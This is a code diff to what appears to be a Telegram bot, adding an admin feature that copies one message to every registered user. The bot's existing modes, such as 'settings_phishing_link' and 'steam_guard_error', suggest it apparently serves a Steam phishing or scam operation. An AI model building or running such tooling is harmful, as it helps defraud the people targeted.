@@ -24,6 +24,7 @@ type UserFlow =
   | { mode: "settings_phishing_link" }
   | { mode: "admin_logs_search" }
   | { mode: "admin_find_user"; payload: { returnPage: number } }
+  | { mode: "admin_broadcast_input" }
   | { mode: "draw_input:add_friend"; payload: { variant: "link" | "id"; promptMessageId: number | null } }
   | { mode: "draw_input:acc_blocked"; payload: { variant: "link" | "id"; promptMessageId: number | null } }
   | { mode: "draw_input:steam_guard_error"; payload: { variant: "link" | "id"; promptMessageId: number | null } }
@@ -778,6 +779,57 @@ function toggleUserBan(userId: number) {
   user.is_banned = Number(user.is_banned || 0) ? 0 : 1;
   saveState();
   return user;
+}
+
+function broadcastRecipients() {
+  const seen = new Set<number>();
+  const result: number[] = [];
+  for (const user of appState().users as any[]) {
+    const tgId = Number(user.tg_id || 0);
+    if (!tgId || seen.has(tgId)) continue;
+    seen.add(tgId);
+    result.push(tgId);
+  }
+  return result;
+}
+
+function waitMs(ms: number) {
+  return new Promise((resolve) => setTimeout(resolve, ms));
+}
+
+async function sendAdminBroadcast(ctx: Ctx, me: any) {
+  const sourceChatId = ctx.chat?.id;
+  const sourceMessageId = ctx.message?.message_id;
+  if (!sourceChatId || !sourceMessageId) return false;
+
+  state.delete(ctx.from.id);
+  const recipients = broadcastRecipients();
+  let sent = 0;
+  let failed = 0;
+  const status = await ctx.reply(`<b>Рассылка запущена.</b>\nПолучателей: <b>${recipients.length}</b>`, { parse_mode: "HTML" }).catch(() => null);
+
+  for (const tgId of recipients) {
+    try {
+      await ctx.telegram.copyMessage(tgId, sourceChatId, sourceMessageId);
+      sent += 1;
+    } catch {
+      failed += 1;
+    }
+    if ((sent + failed) % 20 === 0) {
+      await waitMs(900);
+    } else {
+      await waitMs(35);
+    }
+  }
+
+  const resultText = `<b>Рассылка завершена.</b>\nОтправлено: <b>${sent}</b>\nОшибок: <b>${failed}</b>`;
+  if (status?.message_id) {
+    await ctx.telegram.editMessageText(ctx.chat.id, status.message_id, undefined, resultText, { parse_mode: "HTML" }).catch(() => null);
+  } else {
+    await ctx.reply(resultText, { parse_mode: "HTML" }).catch(() => null);
+  }
+  logEvent(me, "admin_broadcast", `sent:${sent}:failed:${failed}`);
+  return true;
 }
 
 async function renderDrawMenu(ctx: Ctx) {
@@ -2394,6 +2446,12 @@ bot.on("text", async (ctx) => {
     return;
   }
 
+  const activeFlow = state.get(ctx.from.id);
+  if (activeFlow?.mode === "admin_broadcast_input" && hasRole(me, ["ADMIN"])) {
+    await sendAdminBroadcast(ctx, me);
+    return;
+  }
+
   if (isDrawBtn || isOnlineBtn || isSettingsBtn) {
     if (isDrawBtn) {
       await clearUserFlowOnly(ctx);
@@ -2481,7 +2539,26 @@ bot.on("text", async (ctx) => {
     return;
   }
 
+  if (trimmed === "Рассылка" && hasRole(me, ["ADMIN"])) {
+    state.set(ctx.from.id, { mode: "admin_broadcast_input" });
+    await ctx.reply("<b>Отправьте сообщение для рассылки.</b>\nПоддерживается текст, фото, видео, стикеры, документы и другое.", {
+      parse_mode: "HTML",
+    });
+    return;
+  }
+
   await showMainMenu(ctx, me);
+});
+
+bot.on("message", async (ctx) => {
+  if ("text" in (ctx.message || {})) return;
+  const me = ensureUser(ctx);
+  if (!me || Number(me.is_banned || 0) === 1 || !hasRole(me, ["ADMIN"])) return;
+
+  const flow = state.get(ctx.from.id);
+  if (flow?.mode !== "admin_broadcast_input") return;
+
+  await sendAdminBroadcast(ctx, me);
 });
 
 bot.on("callback_query", async (ctx, next) => {
